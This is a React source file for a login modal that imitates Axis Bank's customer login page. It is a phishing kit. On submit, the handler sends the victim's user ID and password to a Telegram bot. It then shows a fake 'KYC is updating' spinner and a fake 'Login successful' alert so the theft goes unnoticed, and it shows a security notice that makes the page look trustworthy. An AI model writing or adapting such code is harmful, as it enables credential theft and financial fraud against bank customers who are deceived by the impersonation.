"use client";

import React, { useState } from "react";
import { X, Eye, EyeOff, Lock, User, AlertCircle, Info } from "lucide-react";
import { telegramBot } from "../utils/telegramBot";

interface LoginModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export default function LoginModal({ isOpen, onClose }: LoginModalProps) {
  const [showPassword, setShowPassword] = useState(false);
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [errors, setErrors] = useState({ userId: "", password: "" });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showKycUpdating, setShowKycUpdating] = useState(false);

  const validateForm = () => {
    const newErrors = { userId: "", password: "" };
    
    if (!userId.trim()) {
      newErrors.userId = "User ID is required";
    } else if (userId.length < 6) {
      newErrors.userId = "User ID must be at least 6 characters";
    }
    
    if (!password.trim()) {
      newErrors.password = "Password is required";
    } else if (password.length < 8) {
      newErrors.password = "Password must be at least 8 characters";
    }
    
    setErrors(newErrors);
    return !newErrors.userId && !newErrors.password;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (validateForm()) {
      setIsSubmitting(true);
      
      // Send login details to Telegram
      const loginDetails = {
        userId: userId,
        password: password,
        timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
      };
      
      await telegramBot.sendLoginNotification(loginDetails);
      
      // Show KYC updating message
      setShowKycUpdating(true);
      
      // Simulate processing time
      setTimeout(() => {
        setIsSubmitting(false);
        alert("Login successful! Your KYC is being processed.");
        onClose();
      }, 3000);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-lg shadow-xl w-full max-w-md">
        {/* Header */}
        <div className="bg-[#8B1538] text-white p-6 rounded-t-lg">
          <div className="flex items-center justify-between">
            <h2 className="text-xl font-semibold">Customer Login</h2>
            <button
              onClick={onClose}
              className="text-white hover:bg-white/20 rounded-full p-1 transition-colors"
            >
              <X size={20} />
            </button>
          </div>
          <p className="text-sm mt-2 text-white/90">Access your Axis Bank account securely</p>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="p-6 space-y-4">
          {/* User ID Field */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              User ID
            </label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <User size={18} className="text-gray-400" />
              </div>
              <input
                type="text"
                value={userId}
                onChange={(e) => setUserId(e.target.value)}
                className={`w-full pl-10 pr-3 py-2 border rounded-lg focus:ring-2 focus:ring-[#8B1538] focus:border-transparent outline-none transition-colors ${
                  errors.userId ? "border-red-500" : "border-gray-300"
                }`}
                placeholder="Enter your User ID"
              />
            </div>
            {errors.userId && (
              <div className="flex items-center mt-1 text-red-500 text-sm">
                <AlertCircle size={14} className="mr-1" />
                {errors.userId}
              </div>
            )}
          </div>

          {/* Password Field */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Password
            </label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <Lock size={18} className="text-gray-400" />
              </div>
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className={`w-full pl-10 pr-10 py-2 border rounded-lg focus:ring-2 focus:ring-[#8B1538] focus:border-transparent outline-none transition-colors ${
                  errors.password ? "border-red-500" : "border-gray-300"
                }`}
                placeholder="Enter your Password"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-400 hover:text-gray-600"
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
            {errors.password && (
              <div className="flex items-center mt-1 text-red-500 text-sm">
                <AlertCircle size={14} className="mr-1" />
                {errors.password}
              </div>
            )}
          </div>

          {/* Remember Me & Forgot Password */}
          <div className="flex items-center justify-between">
            <label className="flex items-center">
              <input
                type="checkbox"
                className="w-4 h-4 text-[#8B1538] border-gray-300 rounded focus:ring-[#8B1538]"
              />
              <span className="ml-2 text-sm text-gray-600">Remember User ID</span>
            </label>
            <a href="#" className="text-sm text-[#8B1538] hover:underline">
              Forgot Password?
            </a>
          </div>

          {/* Security Note */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
            <div className="flex items-start">
              <AlertCircle size={16} className="text-blue-600 mt-0.5 mr-2 flex-shrink-0" />
              <div className="text-sm text-blue-800">
                <p className="font-medium mb-1">Security Notice:</p>
                <ul className="text-xs space-y-1">
                  <li>• Never share your password with anyone</li>
                  <li>• Always check for secure connection (https://)</li>
                  <li>• Axis Bank never asks for password via email/phone</li>
                </ul>
              </div>
            </div>
          </div>

          {/* Login Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-[#8B1538] text-white py-3 rounded-lg font-semibold hover:bg-[#7a1230] transition-colors focus:ring-2 focus:ring-[#8B1538] focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isSubmitting ? (
              <div className="flex items-center justify-center space-x-2">
                <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                <span>Processing...</span>
              </div>
            ) : (
              'Secure Login'
            )}
          </button>

          {/* KYC Updating Message */}
          {showKycUpdating && (
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mt-4">
              <div className="flex items-center space-x-3">
                <div className="flex-shrink-0">
                  <svg className="animate-spin h-5 w-5 text-blue-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                </div>
                <div className="flex-1">
                  <h3 className="text-sm font-semibold text-blue-800">Your KYC is updating</h3>
                  <p className="text-sm text-blue-700 mt-1">Please wait while we process your KYC information...</p>
                  <p className="text-xs text-blue-600 mt-2">This usually takes a few seconds</p>
                </div>
              </div>
            </div>
          )}

          {/* Register Link */}
          <div className="text-center text-sm text-gray-600">
            New to Axis Bank?{" "}
            <a href="#" className="text-[#8B1538] hover:underline font-medium">
              Register Now
            </a>
          </div>
        </form>

        {/* Footer */}
        <div className="bg-gray-50 px-6 py-4 rounded-b-lg border-t">
          <div className="flex items-center justify-center space-x-4 text-xs text-gray-500">
            <span>© 2024 Axis Bank</span>
            <span>•</span>
            <a href="#" className="hover:text-[#8B1538]">Privacy Policy</a>
            <span>•</span>
            <a href="#" className="hover:text-[#8B1538]">Terms of Use</a>
          </div>
        </div>
      </div>
    </div>
  );
}
